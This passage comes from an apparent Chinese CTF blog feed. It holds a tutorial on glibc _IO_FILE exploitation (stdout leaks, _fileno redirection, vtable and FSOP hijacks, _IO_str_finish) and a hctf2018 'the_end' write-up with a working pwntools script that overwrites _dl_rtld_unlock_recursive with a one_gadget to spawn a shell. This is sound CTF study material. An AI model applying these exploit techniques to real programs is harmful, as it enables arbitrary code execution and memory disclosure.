      
    
    
    
    
    <category term="ciscn" scheme="http://example.com/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>_IO_FILE基础利用</title>
    <link href="http://example.com/2024/06/11/IO-FILE%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2024/06/11/IO-FILE%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/</id>
    <published>2024-06-11T11:46:46.000Z</published>
    <updated>2024-06-11T11:47:07.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IO-FILE利用"><a href="#IO-FILE利用" class="headerlink" title="_IO_FILE利用"></a>_IO_FILE利用</h1><blockquote><p>sky123师傅博客：<a href="http://t.csdnimg.cn/O8y8S%EF%BC%8C%E4%BB%8EIO_FILE%E7%9A%84%E7%BB%93%E6%9E%84%E3%80%81%E5%8E%9F%E7%90%86%E5%88%B0%E5%88%A9%E7%94%A8%EF%BC%8C%E5%86%99%E5%BE%97%E6%9E%81%E5%85%B6%E8%AF%A6%E7%BB%86%E6%98%93%E6%87%82">http://t.csdnimg.cn/O8y8S，从IO_FILE的结构、原理到利用，写得极其详细易懂</a></p><p>hollk师傅：<a href="https://blog.csdn.net/qq_41202237/article/details/113845320">好好说话之IO_FILE利用（1）：利用_IO_2_1_stdout泄露libc_libc泄露方式-CSDN博客</a></p></blockquote><p>_IO_FILE结构 在2.31中定义在了struct_FILE.h头文件中</p><p>参照sky123师傅的贴图仿作出一幅IO_FILE结构关系图</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406082020458.png" alt="image-20240608202007286"></p><h1 id="1-FILE结构"><a href="#1-FILE结构" class="headerlink" title="1.FILE结构"></a>1.FILE结构</h1><p><strong>_IO_FILE</strong>结构在较低版本的libc中定义在glibc&#x2F;libio&#x2F;libio.h，较高版本定义在glibc&#x2F;libio&#x2F;bits\types\struct_FILE.h中，__IO_FILE结构体中存储缓冲区相关的成员变量。</p><p><strong>_IO_list_all</strong>指向最后创建的FILE结构（初始化后指向__IO_2_1_stderr），各FILE结构通过_chain域链接形成一个单项链表。</p><p><strong>_IO_FILE_plus</strong>中包含了_IO_FILE结构以及名为<strong>vtable</strong>的 _IO_jump_t 结构的虚表，所有FILE结构体的虚表指针均指向向虚表<strong>_IO_file_jumps</strong>，在进行<strong>IO</strong>操作时，都会调用到该结构体中的函数，即作为公共函数表使用（函数多态性呈现）。</p><p>进行IO操作时，大致流程是通过访问__IO_FILE结构体中的缓冲区相关变量，通过调用虚表中指定的一系列函数来完成操作。</p><p>那么我们的利用大概分为四个方向：a.__IO_FILE结构体成员变量；b.虚表；c.__IO_FILE_plus；</p><p>过多关于FILE结构的内容就不过多描述了，不太想过多的炒冷饭。直接讲讲利用了。</p><h1 id="2-利用"><a href="#2-利用" class="headerlink" title="2.利用"></a>2.利用</h1><h2 id="2-1-IO-FILE结构体成员变量"><a href="#2-1-IO-FILE结构体成员变量" class="headerlink" title="2.1 __IO_FILE结构体成员变量"></a>2.1 __IO_FILE结构体成员变量</h2><h3 id="IO-2-1-stdout成员变量利用"><a href="#IO-2-1-stdout成员变量利用" class="headerlink" title="__IO_2_1_stdout成员变量利用"></a>__IO_2_1_stdout成员变量利用</h3><p>通过伪造stdout结构体中的成员变量来达成任意地址读的目的。</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091415745.png" alt="image-20240609141531616"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091440957.png" alt="image-20240609144052890"></p><p>挟持流程：puts –&gt; _IO_puts –&gt; _IO_new_file_xsputn –&gt; _IO_new_file_overflow –&gt; _IO_do_write(FILE, __IO_write_base, size)  –&gt;   _IO_do_write –&gt; _IO_new_do_write –&gt;  new_do_write</p><p>当我们能控制__IO_2_1_stdout中的成员变量，就能挟持puts执行_IO_do_write，从而泄露 __IO_write_base 到 __IO_write_ptr之间的数据</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>_IO_new_file_overflow  –&gt;  设置_flag &#x3D; 0xFBAD0800</p><blockquote><p>check1：if (f-&gt;_flags &amp; _IO_NO_WRITES)    &#x3D;&#x3D;&gt;   设置_flag标志位不包含_IO_NO_WRITES （8）</p><p>check2： if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) &#x3D;&#x3D; 0 || f-&gt;_IO_write_base &#x3D;&#x3D; NULL)  &#x2F;&#x2F;检查输出缓冲区是否为空    &#x3D;&#x3D;&gt; 设置_flag标志位包含_IO_CURRENTLY_PUTTING  （0x800）</p></blockquote><pre class=" language-highlight c"><span class="meta">#<span class="keyword"><code class="language-highlight c"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span>_flags & _IO_NO_WRITES = <span class="number">0</span> _flags = <span class="number">0xfbad0000</span>_files & _IO_CURRENTLY_PUTTING = <span class="number">1</span>_flags = <span class="number">0xFBAD0800</span></code></pre><p>new_do_write</p><blockquote><p>我们需要进入以下其中一分支</p><p>check1：if (fp-&gt;_flags &amp; _IO_IS_APPENDING)  &#x3D;&#x3D;&gt;  设置_flag标志位包含_IO_IS_APPENDING</p><p>check2：if (fp-&gt;_IO_read_end !&#x3D; fp-&gt;_IO_write_base) &#x3D;&#x3D;&gt;  设置_IO_read_end &#x3D; _IO_write_base就能绕过判断，但是如果我们要进入该分支需要的构造点就有很多了</p><blockquote><p> else if (fp-&gt;_IO_read_end !&#x3D; fp-&gt;_IO_write_base)  &#x2F;&#x2F;_IO_read_end &#x3D; _IO_write_base 0x1000的对齐机制，覆盖末位字节难以控制相等<br> {<br>   off64_t new_pos<br>     &#x3D; _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);  &#x2F;&#x2F;调用_IO_SYSSEEK，syseek函数可能会执行不成功而退出<br>   if (new_pos &#x3D;&#x3D; _IO_pos_BAD)<br>     return 0;<br>   fp-&gt;_offset &#x3D; new_pos;<br> }</p></blockquote><p>所以我们一般选择进入check1的分支中</p></blockquote><pre class=" language-highlight c"><span class="meta">#<span class="keyword"><code class="language-highlight c"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span>_flags = <span class="number">0xfbad0000</span>_files & _IO_CURRENTLY_PUTTING = <span class="number">1</span>_flags = <span class="number">0xFBAD0800</span>_flags & _IO_IS_APPENDING = <span class="number">1</span>_flags = <span class="number">0xfbad1800</span></code></pre><p>再将_IO_write_base设置成为需要泄露的位置，_IO_write_ptr指向泄露结束的地址，即可泄露信息</p><p>printf调用链：__printf (printf.c)–&gt; __vfprintf_internal（iovsprintf.c，低版本为vfprintf） –&gt;  _IO_file_xsputn –&gt; 后面与puts调用相同</p><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><pre class=" language-highlight c"><span class="type">int</span> a = <span class="number"><code class="language-highlight c"><span class="type">int</span> a = <span class="number">11111111</span>;<span class="type">char</span> b[<span class="number">8</span>] = <span class="string">"abcdefg"</span>;<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, a);</code></pre><p>调用栈示例   2.31-0ubuntu9.7</p><p>调用printf前设置_flags字段为 0xfbad1800 ，_IO_write_base为&amp;b，_IO_write_ptr为&amp;b+8</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091541157.png" alt="image-20240609154157045"></p><p>调用栈，这里会打印出 abcdefg</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091545477.png" alt="image-20240609154556408"></p><h3 id="利用-fileno-字段泄露数据"><a href="#利用-fileno-字段泄露数据" class="headerlink" title="利用 _fileno 字段泄露数据"></a>利用 _fileno 字段泄露数据</h3><pre class=" language-highlight c"><span class="class"><span class="keyword">struct</span> _<span class="title"><code class="language-highlight c"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span><span class="class">&#123;</span>  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span>  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span>  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span>  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span>  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span>  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span>  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span>  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span>  <span class="comment">/* The following fields are used to support backing up and undo. */</span>  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span>  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span>  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span>  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>  <span class="type">int</span> _fileno;   <span class="comment">//文件描述符</span>  <span class="type">int</span> _flags2;  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span>  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span>  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;  <span class="type">char</span> _shortbuf[<span class="number">1</span>];  _IO_lock_t *_lock;<span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span>&#125;;</code></pre><p>通过修改 _fileno(_IO_FILE结构偏移0x70处) </p><p>进程中系统默认包含三个文件流stdin\stdout\stderr，文件描述符0\1\2。如果修改stdin的_fileno字段为3，即可从文件描述符为3的文件中读取。</p><h4 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h4><pre class=" language-highlight c"><span class="meta">#<span class="keyword">include</span> <span class="string"><code class="language-highlight c"><span class="meta">#<span class="keyword">include</span> <span class="string"><stdio.h></span></span><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;    <span class="type">char</span> stack_buf[<span class="number">0x100</span>];    FILE *fp = fopen(<span class="string">"flag"</span>, <span class="string">"rw"</span>);    <span class="comment">// scanf("%256s", &stack_buf);</span>    <span class="comment">// scanf("%256s", &stack_buf);</span>    fgets(stack_buf, <span class="keyword">sizeof</span>(stack_buf), <span class="built_in">stdin</span>); <span class="comment">//1</span>    fgets(stack_buf, <span class="keyword">sizeof</span>(stack_buf), <span class="built_in">stdin</span>); <span class="comment">//2</span>    <span class="built_in">puts</span>(stack_buf);&#125;</code></pre><p>在未执行到1时，stdin还未初始化</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091645363.png" alt="image-20240609164506277"></p><p>执行1以后</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091645172.png" alt="image-20240609164539105"></p><p>此时stdin._fileno被设置为0，执行2将会从标准输入中读取</p><p>我们设置stdin._fileno为3，第二个fgets将会从文件描述符为3的文件中读取，即读取flag</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091658893.png" alt="image-20240609165814755"></p><h3 id="stdin任意地址写"><a href="#stdin任意地址写" class="headerlink" title="stdin任意地址写"></a>stdin任意地址写</h3><p>任意地址写的实际利用遇到的并不是很多，不写原理了。</p><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><blockquote><p>设置 _IO_read_end 等于_IO_read_ptr 。<br>设置 _flag &amp;~ _IO_NO_READS 即 _flag &amp;~ 0x4。<br>设置 _fileno 为 0 ，表示读入数据的来源是 stdin 。<br>设置 _IO_buf_base 为 write_start ，_IO_buf_end 为 write_end ；且使得 _IO_buf_end - _IO_buf_base 大于 fread 要读的数据</p></blockquote><h3 id="stdout任意地址写"><a href="#stdout任意地址写" class="headerlink" title="stdout任意地址写"></a>stdout任意地址写</h3><h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><blockquote><p>_IO_write_ptr 指向 write_start ，_IO_write_end 指向 write_end 即可实现在目标地址写入数据。  &#x3D;&#x3D;&gt; 将打印内容的前size位写入到了write_start中</p></blockquote><h2 id="2-2-虚表"><a href="#2-2-虚表" class="headerlink" title="2.2 虚表"></a>2.2 虚表</h2><p>vtable挟持：1.改vtable中的函数指针；2.改vtable指针指向可控内存</p><p>vtable一般不可改。</p><blockquote><p>IO 调用的 vtable 函数：</p><p>fopen 函数是在分配空间，建立 FILE 结构体，未调用 vtable 中的函数。</p><p>fread 函数中调用的 vtable 函数有：</p><ul><li><p>_IO_sgetn 函数调用了 vtable 的 _IO_file_xsgetn 。</p></li><li><p>_IO_doallocbuf 函数调用了 vtable 的 _IO_file_doallocate 以初始化输入缓冲区。</p></li><li><p>vtable 中的 _IO_file_doallocate 调用了 vtable 中的 __GI__IO_file_stat 以获取文件信息。</p></li><li><p>__underflow 函数调用了 vtable 中的 _IO_new_file_underflow 实现文件数据读取。</p></li><li><p>vtable 中的 _IO_new_file_underflow 调用了 vtable__GI__IO_file_read 最终去执行系统调用read。</p></li></ul><p>fwrite 函数调用的 vtable 函数有：</p><ul><li><p>_IO_fwrite 函数调用了 vtable 的 _IO_new_file_xsputn 。</p></li><li><p>_IO_new_file_xsputn 函数调用了 vtable 中的 _IO_new_file_overflow 实现缓冲区的建立以及刷新缓冲区。</p></li><li><p>vtable 中的 _IO_new_file_overflow 函数调用了 vtable 的 _IO_file_doallocate 以初始化输入缓冲区。</p></li><li><p>vtable 中的 _IO_file_doallocate 调用了 vtable 中的 __GI__IO_file_stat 以获取文件信息。</p></li><li><p>new_do_write 中的 _IO_SYSWRITE 调用了 vtable_IO_new_file_write 最终去执行系统调用write。</p></li></ul><p>fclose 函数调用的 vtable 函数有：</p><ul><li>在清空缓冲区的 _IO_do_write 函数中会调用 vtable 中的函数。</li><li>关闭文件描述符 _IO_SYSCLOSE 函数为 vtable 中的 __close 函数。</li><li>_IO_FINISH 函数为 vtable 中的 __finish 函数.</li></ul></blockquote><blockquote><p>1.fread函数调用_IO_FILE_plus.vtable中的_IO_XSGETN指针<br>2.fwrite函数调用_IO_FILE_plus.vtable中的_IO_XSPUTN指针，_IO_XSPUTN中会调用同样位于 vtable 中的_IO_OVERFLOW指针<br>3.fclose函数调用_IO_FILE_plus.vtable中的_IO_FINISH指针<br>4.printf&#x2F;puts与fwrite函数调用大致相同，均会调用_IO_XSPUTN指针和_IO_OVERFLOW指针</p></blockquote><p>2.24版本以前可以直接伪造vtable来构造虚假的跳表调用目的函数，2.24以后新增_IO_vtable_check函数</p><p>一般都是修改vtable中的指针，然后再触发调用即可实现利用</p><h2 id="2-3-IO-FILE-plus-FSOP"><a href="#2-3-IO-FILE-plus-FSOP" class="headerlink" title="2.3  __IO_FILE_plus   FSOP"></a>2.3  __IO_FILE_plus   FSOP</h2><p>&lt;2.24</p><p>挟持_IO_list_all指向伪造的__IO_FILE_plus，之后使程序执行_IO_flush_all_lockp函数，刷新_IO_list_all中所有项的文件流，触发_IO_overflow</p><blockquote><p>程序执行 _IO_flush_all_lockp 函数有三种情况：</p><p>当 libc 执行 abort 流程时<br>当执行 exit 函数时<br>当执行流从 main 函数返回时</p></blockquote><p>挟持方法</p><blockquote><p>1.覆盖 _IO_2_1_stderr_ 结构体</p><p>2.利用large bin attack来将_IO_list_all覆盖成为一个chunk地址，然后在chunk上伪造一个fake_IO_FILE结构体</p></blockquote><h2 id="2-4-IO-str-jumps"><a href="#2-4-IO-str-jumps" class="headerlink" title="2.4  __IO_str_jumps"></a>2.4  __IO_str_jumps</h2><p>2.24~2.28   _IO_vtable_check的增加，限制了伪造vtable指针的区域限制</p><p>具体利用可以看对[hctf_2018] the_end的分析</p><pre class=" language-highlight c"><span class="type">void</span> _IO_vtable_check (<span class="type"><code class="language-highlight c"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;<span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *<span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span>&#123;  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;  <span class="keyword">if</span> (__glibc_unlikely (offset >= section_length))    _IO_vtable_check ();  <span class="keyword">return</span> vtable;&#125;</code></pre><blockquote><p>绕过if (__glibc_unlikely (offset &gt;&#x3D; section_length))  –&gt;   __start___libc_IO_vtables&lt;   *vtable &lt; __stop___libc_IO_vtables</p><p>_IO_str_jumps 与 __IO_wstr_jumps 就位于 __stop___libc_IO_vtables 和 __start___libc_IO_vtables 之间</p><p>将vtable指向 _IO_str_jumps  或者 __IO_wstr_jumps </p></blockquote><pre class=" language-highlight c"><code class="language-highlight c">pwndbg> p _IO_str_jumps$<span class="number">1</span> = &#123;  __dummy = <span class="number">0</span>,  __dummy2 = <span class="number">0</span>,  __finish = <span class="number">0x7ffff7a83fb0</span> <_IO_str_finish>,  __overflow = <span class="number">0x7ffff7a83c90</span> <__GI__IO_str_overflow>,  __underflow = <span class="number">0x7ffff7a83c30</span> <__GI__IO_str_underflow>,  __uflow = <span class="number">0x7ffff7a82610</span> <__GI__IO_default_uflow>,  __pbackfail = <span class="number">0x7ffff7a83f90</span> <__GI__IO_str_pbackfail>,  __xsputn = <span class="number">0x7ffff7a82640</span> <__GI__IO_default_xsputn>,  __xsgetn = <span class="number">0x7ffff7a82720</span> <__GI__IO_default_xsgetn>,  __seekoff = <span class="number">0x7ffff7a840e0</span> <__GI__IO_str_seekoff>,  __seekpos = <span class="number">0x7ffff7a82a10</span> <_IO_default_seekpos>,  __setbuf = <span class="number">0x7ffff7a82940</span> <_IO_default_setbuf>,  __sync = <span class="number">0x7ffff7a82c10</span> <_IO_default_sync>,  __doallocate = <span class="number">0x7ffff7a82a30</span> <__GI__IO_default_doallocate>,  __read = <span class="number">0x7ffff7a83ae0</span> <_IO_default_read>,  __write = <span class="number">0x7ffff7a83af0</span> <_IO_default_write>,  __seek = <span class="number">0x7ffff7a83ac0</span> <_IO_default_seek>,  __close = <span class="number">0x7ffff7a82c10</span> <_IO_default_sync>,  __stat = <span class="number">0x7ffff7a83ad0</span> <_IO_default_stat>,  __showmanyc = <span class="number">0x7ffff7a83b00</span> <_IO_default_showmanyc>,  __imbue = <span class="number">0x7ffff7a83b10</span> <_IO_default_imbue>&#125;pwndbg> p _IO_file_jumps$<span class="number">2</span> = &#123;  __dummy = <span class="number">0</span>,  __dummy2 = <span class="number">0</span>,  __finish = <span class="number">0x7ffff7a809d0</span> <_IO_new_file_finish>,  __overflow = <span class="number">0x7ffff7a81740</span> <_IO_new_file_overflow>,  __underflow = <span class="number">0x7ffff7a814b0</span> <_IO_new_file_underflow>,  __uflow = <span class="number">0x7ffff7a82610</span> <__GI__IO_default_uflow>,  __pbackfail = <span class="number">0x7ffff7a83990</span> <__GI__IO_default_pbackfail>,  __xsputn = <span class="number">0x7ffff7a801f0</span> <_IO_new_file_xsputn>,  __xsgetn = <span class="number">0x7ffff7a7fed0</span> <__GI__IO_file_xsgetn>,  __seekoff = <span class="number">0x7ffff7a7f4d0</span> <_IO_new_file_seekoff>,  __seekpos = <span class="number">0x7ffff7a82a10</span> <_IO_default_seekpos>,  __setbuf = <span class="number">0x7ffff7a7f440</span> <_IO_new_file_setbuf>,  __sync = <span class="number">0x7ffff7a7f380</span> <_IO_new_file_sync>,  __doallocate = <span class="number">0x7ffff7a74190</span> <__GI__IO_file_doallocate>,  __read = <span class="number">0x7ffff7a801b0</span> <__GI__IO_file_read>,  __write = <span class="number">0x7ffff7a7fb80</span> <_IO_new_file_write>,  __seek = <span class="number">0x7ffff7a7f980</span> <__GI__IO_file_seek>,  __close = <span class="number">0x7ffff7a7f350</span> <__GI__IO_file_close>,  __stat = <span class="number">0x7ffff7a7fb70</span> <__GI__IO_file_stat>,  __showmanyc = <span class="number">0x7ffff7a83b00</span> <_IO_default_showmanyc>,  __imbue = <span class="number">0x7ffff7a83b10</span> <_IO_default_imbue>&#125;pwndbg></code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111906781.png" alt="image-20240611190216858"></p><h3 id="io-str-finish利用"><a href="#io-str-finish利用" class="headerlink" title="io_str_finish利用"></a>io_str_finish利用</h3><p>通过修改vtable指针指向&amp;_IO_str_jumps-8后，我们成功设置了跳表偏移，我们原本调用__overflow这时会调用__finish</p><p>strops.c</p><pre class=" language-highlight c"><span class="type"><code class="language-highlight c"><span class="type">void</span>_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)&#123;  <span class="keyword">if</span> (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);  fp->_IO_buf_base = <span class="literal">NULL</span>;  _IO_default_finish (fp, <span class="number">0</span>);&#125;</code></pre><p>调用了_IO_str_finish，我们的目的是调用(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</p><p>所以需要</p><ul><li>_IO_buf_base 不为空   可以设置为bin_sh_addr</li><li>!(fp-&gt;_flags &amp; _IO_USER_BUF)   #define _IO_USER_BUF 1   &#x3D;&#x3D;&gt;  _flags低位为0</li><li>_IO_write_base &lt; _IO_write_ptr   </li><li>_mode &lt;&#x3D; 0</li></ul><h3 id="IO-validate-vtable-利用"><a href="#IO-validate-vtable-利用" class="headerlink" title="IO_validate_vtable 利用"></a>IO_validate_vtable 利用</h3><p>2.24以上通过IO_validate_vtable检查vtable指向的地址是否合法</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111940498.png" alt="image-20240611194010402"></p><p>IO_validate_vtable 利用：IO_validate_vtable –&gt; _IO_vtable_check –&gt; rtld_active () –&gt; _dl_addr –&gt; __rtld_lock_unlock_recursive (GL(dl_load_lock))</p><p>我们的目标是调用 __rtld_lock_unlock_recursive (GL(dl_load_lock))  那么需要rtld_active ()返回为true，然后会调用_dl_addr 中的__rtld_lock_unlock_recursive </p><p>然后打exit hook类似。</p><h1 id="一些话"><a href="#一些话" class="headerlink" title="一些话"></a>一些话</h1><p>作为IO_FILE基础入门sky123师傅写的博客是极好的</p><p>剩下来与堆利用相结合就不写了</p><p>IO利用会跟多的与libc版本相挂钩，也与函数的深层调用有很大关系，通过学习IO_FILE结构能极大的帮助理解函数深层调用的约定</p><blockquote><p>一些关键的libc版本记录：2.24增加_IO_vtable_check；2.28  _IO_str_finish 不再调用 _free_buffer 而是直接是直接调用 free；glibc-2.34 IO_validate_vtable 利用失效；自 glibc-2.27 开始，abort 函数发生较大改动，不再调用 <code>_IO_flush_all_lockp</code> 函数</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IO-FILE利用&quot;&gt;&lt;a href=&quot;#IO-FILE利用&quot; class=&quot;headerlink&quot; title=&quot;_IO_FILE利用&quot;&gt;&lt;/a&gt;_IO_FILE利用&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;sky123师傅博客：&lt;a href=&quot;http://</summary>
      
    
    
    
    
    <category term="IO" scheme="http://example.com/tags/IO/"/>
    
  </entry>
  
  <entry>
    <title>the_end</title>
    <link href="http://example.com/2024/06/10/the-end/"/>
    <id>http://example.com/2024/06/10/the-end/</id>
    <published>2024-06-10T13:21:59.000Z</published>
    <updated>2024-06-11T05:38:50.387Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hctf2018-the-end"><a href="#hctf2018-the-end" class="headerlink" title="hctf2018_the_end"></a>hctf2018_the_end</h1><p>远程：2.27-3ubuntu1</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091758971.png" alt="image-20240609175811827"></p><p>每次往一个地址里面写1字节，给了libc</p><h2 id="dl-rtld-unlock-recursive-dl-rtld-lock-recursive"><a href="#dl-rtld-unlock-recursive-dl-rtld-lock-recursive" class="headerlink" title="_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive"></a>_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive</h2><p>往libc中写入数据，通过exit退出，打exithook，用one_gadget来获取shell</p><p>我们劫持ld中rtld_global结构体的_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive</p><p>最后打的是_dl_rtld_unlock_recursive   _dl_rtld_lock_recursive没通</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;node5.buuoj.cn 28004&#x27;</span>    pwnfile = <span class="string">&#x27;./the_end&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    ru(<span class="string">b&#x27;0x&#x27;</span>)    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]    one_gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>, <span class="number">0xe569f</span>, <span class="number">0xe5858</span>, <span class="number">0xe585f</span>, <span class="number">0xe5863</span>, <span class="number">0x10a398</span>]    one = libc_base + one_gadget[<span class="number">7</span>]    ori0 = one & <span class="number">0xff</span>    ori1 = one>><span class="number">8</span> & <span class="number">0xff</span>    ori2 = one>><span class="number">16</span> & <span class="number">0xff</span>    ori3 = one>><span class="number">24</span> & <span class="number">0xff</span>    ori4 = one>><span class="number">32</span> & <span class="number">0xff</span>    leak(<span class="string">"one_gadget"</span>, one)    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori0))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori3))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))    IO_file_overflow = <span class="number">0x3e82b8</span> + libc_base    IO_file_underflow = <span class="number">0x3e82c0</span> + libc_base    dl_rtld_lock_recursive = <span class="number">0x619f60</span> + libc_base    dl_rtld_unlock_recursive  = <span class="number">0x619f68</span> + libc_base    leak(<span class="string">"IO_file_overflow"</span>, IO_file_overflow)    ru(<span class="string">b&#x27; good luck ;)\n&#x27;</span>)    <span class="comment"># debug()</span>    s(p64(dl_rtld_unlock_recursive))    s(p8(ori0))    s(p64(dl_rtld_unlock_recursive+<span class="number">1</span>))    s(p8(ori1))    s(p64(dl_rtld_unlock_recursive+<span class="number">2</span>))    s(p8(ori2))    s(p64(dl_rtld_unlock_recursive+<span class="number">3</span>))    s(p8(ori3))    s(p64(dl_rtld_unlock_recursive+<span class="number">4</span>))    s(p8(ori4))    itr()</code></pre><h2 id="fini-array"><a href="#fini-array" class="headerlink" title="fini_array"></a>fini_array</h2><p>如果没开pie和RELRO的话直接改fini_array为one_gadget打了，不过这种题目很少了</p><h2 id="IO-flush-all-lockp-IO-unbuffer-all"><a href="#IO-flush-all-lockp-IO-unbuffer-all" class="headerlink" title="_IO_flush_all_lockp&#x2F;  _IO_unbuffer_all ()"></a>_IO_flush_all_lockp&#x2F;  _IO_unbuffer_all ()</h2><p>我们分析一下exit的调用链</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406101735021.png" alt="image-20240610173504887"></p><p>正常调用链：exit –&gt; __run_exit_handlers  –&gt; _exit -&gt; INLINE_SYSCALL </p><p>在调用__run_exit_handlers  时，会触发   RUN_HOOK (__libc_atexit, ()); 调用libc退出时的析构函数__libc_atexit，位于__libc_atexit段上，里面默认只有一个函数fcloseall()</p><pre class=" language-highlight assembly"><code class="language-highlight assembly">__libc_atexit:00000000003E7738 ; ===========================================================================__libc_atexit:00000000003E7738__libc_atexit:00000000003E7738 ; Segment type: Pure data__libc_atexit:00000000003E7738 ; Segment permissions: Read/Write__libc_atexit:00000000003E7738 __libc_atexit   segment qword public &#x27;DATA&#x27; use64__libc_atexit:00000000003E7738                 assume cs:__libc_atexit__libc_atexit:00000000003E7738                 ;org 3E7738h__libc_atexit:00000000003E7738 off_3E7738      dq offset fcloseall_0   ; DATA XREF: sub_42ED0+202↑o__libc_atexit:00000000003E7738                                         ; __libc_freeres+28↑o__libc_atexit:00000000003E7738 __libc_atexit   